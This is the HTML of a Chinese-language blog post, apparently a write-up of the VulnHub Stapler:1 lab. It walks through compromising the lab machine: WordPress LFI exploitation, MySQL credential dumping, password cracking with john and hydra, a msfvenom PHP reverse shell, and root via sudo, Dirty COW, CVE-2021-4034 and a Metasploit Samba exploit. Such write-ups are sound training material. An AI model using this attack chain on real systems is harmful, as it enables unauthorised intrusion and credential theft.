@@ -1,0 +1,281 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Stapler-1 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="No.6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stapler-1">
+<meta property="og:url" content="https://4reexile.github.io/article/Stapler-1/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="No.6">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-09-28T13:06:01.000Z">
+<meta property="article:modified_time" content="2024-09-28T13:10:51.439Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="FTP">
+<meta property="article:tag" content="SMB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/Stapler-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Stapler-1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-28 21:10:51'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Stapler-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-28T13:06:01.000Z" title="Created 2024-09-28 21:06:01">2024-09-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-28T13:10:51.439Z" title="Updated 2024-09-28 21:10:51">2024-09-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.7k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Stapler-1</h1>
+<hr>
+<blockquote>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/stapler-1,150/">vulnhub靶场-Stapler:1</a></p>
+<p>目标: Get Root!</p>
+<p>提示: 至少有2种途径获得shell, 至少有3种方法获得root权限</p>
+<p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+</blockquote>
+<h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2>
+<p>kali: 192.168.56.6</p>
+<p>target:192.168.56.12</p>
+<h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.12</span><br><span class="line">nmap -A 192.168.56.12</span><br></pre></td></tr></table></figure>
+<p>好多的端口呀</p>
+<ul>
+<li>端口: 21,22,53,80,139,666,3306,12380, 还有未开放20,123,137,128</li>
+<li>服务: ftp3.0.3, dnsmasp 2.75, PHP server 5.5(80), MySQL 5.7.12, Apache 2.4.18(12380), smbd 4.3.9(139)</li>
+<li>路径: 仅在80端口有<code>.bashrc</code>和<code>.profile</code>, 无可用信息</li>
+<li>可能利用: ftp有匿名登录</li>
+</ul>
+<p>利用用户名为<code>Anonymous</code>, 密码为空登录ftp服务,找到一个note文件</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928144651989.png" alt="image-20240928144651989"></p>
+<p>下载发现存在两个人名<code>Elly</code>和<code>John</code>, 可能是账号; 你的意思是? 有文件上传?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>看不懂666端口在干嘛, 据说可以用nc连接上去看看这个图片</p>
+</blockquote>
+<p>所以现在有可能能用的就是12380端口Apache, 以及139端口的smb; 下一步可能可以利用的就是22端口和3306端口</p>
+<p>冻手!</p>
+<p>12380处怎么访问都是跳转首页, 令人疑惑, 抓包发现跳转前返回400, 可能是协议错了, 更换为https发现正常, 可以重新扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin</span><br><span class="line">/robots.txt</span><br><span class="line"># 下面都是从robots.txt中来</span><br><span class="line">/admin112233</span><br><span class="line">/blogblog</span><br></pre></td></tr></table></figure>
+<ol>
+<li>先去/admin112233看看</li>
+</ol>
+<p>直接弹窗, 内容为<code>This could of been a BeEF-XSS hook ;)</code>, 抓包也没有任何东西, 可能为前端js弹窗</p>
+<p>禁用js后返回另一条: <code>Give yourself a cookie! Javaseript didn't run =)</code></p>
+<p>但是给自己设置了cookie后也没有任何的用处啊, 拉倒吧</p>
+<ol start="2">
+<li>再去/blogblog</li>
+</ol>
+<p>居然是wordpress框架, 扫一下先, 发现可以查看已安装的插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/blogblog/readme.html    # version 4.2.1</span><br><span class="line">/blogblog/wp-admin</span><br><span class="line">/blogblog/wp-config.php    # 空</span><br><span class="line">/blogblog/wp-login.php</span><br><span class="line">/blogblog/wp-cron.php    # 空</span><br><span class="line">/blogblog/wp-includes    # 只能看文件名和架构</span><br><span class="line">/blogblog/wp-content</span><br></pre></td></tr></table></figure>
+<p><code>/blogblog/wp-content/plugins</code>下是该网站安装的插件, 也许可以利用漏洞</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928165857732.png" alt="image-20240928165857732"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit advanced video</span><br><span class="line"><span class="comment"># 你别说还真有 WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py</span></span><br><span class="line"><span class="comment"># 省略复制下来的过程, 就是locate然后cp, 诶! 你先别急着运行</span></span><br><span class="line">python2 39646.py</span><br></pre></td></tr></table></figure>
+<p>记得复制下来更改目标ip, 再加上关于SSL认证才能用</p>
+<blockquote>
+<p>我相信你通过这个网址能明白为什么要在py文件中加上两行代码</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error">https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error</a></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928173606615.png" alt="image-20240928173606615"></p>
+<p>现在返回<code>/blogblog/wp-content/uploads/</code>会新增jpeg文件, 这个就是配置文件了, 整下来</p>
+<blockquote>
+<p>运行目录下会新增个report文件夹, 可惜啥也没有</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 忽略ssl认证</span></span><br><span class="line">wget --no-check-certificate https://192.168.56.12:12380/blogblog/wp-content/uploads/650253163.jpeg</span><br><span class="line"><span class="comment"># 分析一下是什么文件, 改成对应文件类型</span></span><br><span class="line">file 650253163.jpeg</span><br><span class="line"><span class="built_in">mv</span> 650253163.jpeg config.php</span><br></pre></td></tr></table></figure>
+<p>通过这个wordpress的配置文件获取到了MySQL的密码:<code>root : plbkac</code>, 登录查表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pplbkac -h 192.168.56.12</span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br><span class="line">select user_login,user_pass from wp_users;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928175835329.png" alt="image-20240928175835329"></p>
+<h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2>
+<p>下面就是爆破密码了, 无论用什么方法, 你先把密码整下来变成一个文件(利用awk的方法放在附录)</p>
+<blockquote>
+<p>到达这里只剩wordpress后台和ssh没动过了, smb?(无感情)因为是直接拿到root我就写在附录里面了</p>
+</blockquote>
+<p>掏出<code>john</code>进行爆破, 爆出来账密<code>john : incorrect</code>, 可以登陆wordpress后台了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt pass1.txt</span><br><span class="line"><span class="comment"># 没有rockyou.txt就去/usr/share/wordlists/下解压对应文件</span></span><br></pre></td></tr></table></figure>
+<p>后台找到了上传点<code>Plugins-&gt;Add New-&gt;Upload Plugin</code>, 你也可以直接用这个: <code>/blogblog/wp-admin/plugin-install.php?tab=upload</code></p>
+<p>而且似乎没有过滤, msf立马杀过来</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># msfvenom</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.6 lport=10000 -f raw -o shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># msfconsole</span></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.6</span><br><span class="line"><span class="built_in">set</span> lport 10000</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>在<code>/blogblog/wp-content/uploads/</code>找到并点击那个php文件即可, 这就拿到shell了</p>
+<p>关于ssh, 您猜怎么着, 我拿mysql爆出来的用户名以及已知的密码爆出来了: <code>zoe : plbkac</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra 192.168.1.36 ssh -L users.txt -P pass.txt</span><br><span class="line"><span class="comment"># 这里的pass是user_email中扒出来的, 其实我两列都跑了</span></span><br><span class="line"><span class="comment"># 毕竟从nmap的扫描中可以得到计算机叫做red, 而邮箱又是@red.localhost, 跑跑试试呗</span></span><br></pre></td></tr></table></figure>
+<p>这下两个shell方法都集齐了(可能直接用永恒之蓝不算getshell)</p>
+<p>这里注意到每个用户下都有一个<code>.bash_history</code>, 结合我们在80端口下载的文件, 这是一个记录用户历史命令的文件; 可能会有有用的信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/*/.bash_history</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928195135296.png" alt="image-20240928195135296"></p>
+<p>很巧地得到了用户账密: <code>JKanode : thisimypassword</code>, <code>peter : JZQuyIN5</code></p>
+<h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2>
+<p>信息收集</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># Ubuntu 16.04 LTS</span></span><br><span class="line">gcc -v / g++ -v / cc -v</span><br><span class="line"><span class="comment"># gcc环境有的</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># 这个实在是太多了</span></span><br></pre></td></tr></table></figure>
+<p>给一个批量查询id的linux脚本(记得给予权限), 问就是看看是不是有权限比较高的用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义需要查询的用户名列表</span></span><br><span class="line">usernames=(<span class="string">&quot;Aparnell&quot;</span> <span class="string">&quot;Drew&quot;</span> <span class="string">&quot;LSolum2&quot;</span> <span class="string">&quot;RNunemaker&quot;</span> <span class="string">&quot;Sam&quot;</span> <span class="string">&quot;jess&quot;</span> <span class="string">&quot;www&quot;</span> <span class="string">&quot;CCeaser&quot;</span> <span class="string">&quot;ETollefson&quot;</span> <span class="string">&quot;JKanode&quot;</span> <span class="string">&quot;MBassin&quot;</span> <span class="string">&quot;SHAY&quot;</span> <span class="string">&quot;Taylor&quot;</span> <span class="string">&quot;kai&quot;</span> <span class="string">&quot;zoe&quot;</span> <span class="string">&quot;CJoo&quot;</span> <span class="string">&quot;Eeth&quot;</span> <span class="string">&quot;JLipps&quot;</span> <span class="string">&quot;MFrei&quot;</span> <span class="string">&quot;SHayslett&quot;</span> <span class="string">&quot;elly&quot;</span> <span class="string">&quot;mel&quot;</span> <span class="string">&quot;DSwanger&quot;</span> <span class="string">&quot;IChadwick&quot;</span> <span class="string">&quot;LSolum&quot;</span> <span class="string">&quot;NATHAN&quot;</span> <span class="string">&quot;SStroud&quot;</span> <span class="string">&quot;jamie&quot;</span> <span class="string">&quot;peter&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环遍历用户名列表</span></span><br><span class="line"><span class="keyword">for</span> username <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;usernames[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 使用id命令查询用户的userid并输出结果</span></span><br><span class="line">    userid=$(<span class="built_in">id</span> <span class="variable">$username</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;用户名：<span class="variable">$username</span> 的userid为：<span class="variable">$userid</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928194728160.png" alt="image-20240928194728160"></p>
+<p>我们可以找到peter是可以用sudo提权的, 诶! 这密码不就有用了</p>
+<h3 id="sudo提权"><a class="header-anchor" href="#sudo提权">¶</a>sudo提权</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh peter@192.168.56.12</span><br><span class="line"><span class="comment"># JZQuyIN5</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># (ALL : ALL) ALL 任何位置都能提权</span></span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928200104393.png" alt="image-20240928200104393"></p>
+<h3 id="脏牛提权"><a class="header-anchor" href="#脏牛提权">¶</a>脏牛提权</h3>
+<p>再怎么强大也是假的, dirty cow影响版本从2.6.22-4.8.3/4.7.9/4.4.26, 你这个4.4.0有些不够看了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 40847</span><br><span class="line"><span class="comment"># 靶机这边</span></span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow -s</span><br><span class="line"><span class="comment"># 这些都写在这个cpp文件开头了</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928201744890.png" alt="image-20240928201744890"></p>
+<h3 id="CVE-2021-4034"><a class="header-anchor" href="#CVE-2021-4034">¶</a>CVE-2021-4034</h3>
+<p>这个在我打了4个靶机之后, 我宣布它通杀 ubuntu16</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.6:12000/cve-2021-4034-poc.c</span><br><span class="line">gcc cve-2021-4034-poc.c -o poc</span><br><span class="line"><span class="built_in">chmod</span> 777 poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928202702042.png" alt="image-20240928202702042"></p>
+<h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2>
+<h3 id="awk拆分"><a class="header-anchor" href="#awk拆分">¶</a>awk拆分</h3>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">Linux awk 命令</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F<span class="string">&#x27;|&#x27;</span> <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> mysql.txt &gt; pass1.txt</span><br><span class="line">awk -F<span class="string">&#x27;|&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> mysql.txt &gt; user1.txt</span><br></pre></td></tr></table></figure>
+<p>效果预览, 记得自己再处理一下</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928181816535.png" alt="image-20240928181816535"></p>
+<h3 id="smb-永恒之蓝"><a class="header-anchor" href="#smb-永恒之蓝">¶</a>smb-永恒之蓝</h3>
+<p>139端口就是这样的, 我们搜索到的如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</span><br></pre></td></tr></table></figure>
+<p>搜一下, 然后拿几个比较新的, 是excellent的试一下</p>
+<blockquote>
+<p>其实再排一下Linux, 基本上就剩下一个了</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search Samba</span><br><span class="line"><span class="comment"># exploit/linux/samba/is_known_pipename 那就是你了</span></span><br><span class="line">use exploit/linux/samba/is_known_pipename</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.56.12</span><br><span class="line"><span class="built_in">set</span> rport 139</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928204146507.png" alt="image-20240928204146507"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/Stapler-1/">https://4reexile.github.io/article/Stapler-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/MySQL/">MySQL</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/FTP/">FTP</a><a class="post-meta__tags" href="/tags/SMB/">SMB</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/SkyTower-1/" title="SkyTower-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">SkyTower-1</div></div></a></div><div class="next-post pull-right"><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">IMF-1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/article/FristiLeaks-1.3/" title="FristiLeaks-1.3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-01</div><div class="title">FristiLeaks-1.3</div></div></a></div><div><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">IMF-1</div></div></a></div><div><a href="/article/Jangow-1-01/" title="Jangow-1-01"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-19</div><div class="title">Jangow-1-01</div></div></a></div><div><a href="/article/Lampiao-1/" title="Lampiao-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-18</div><div class="title">Lampiao-1</div></div></a></div><div><a href="/article/Raven-1/" title="Raven-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-30</div><div class="title">Raven-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span 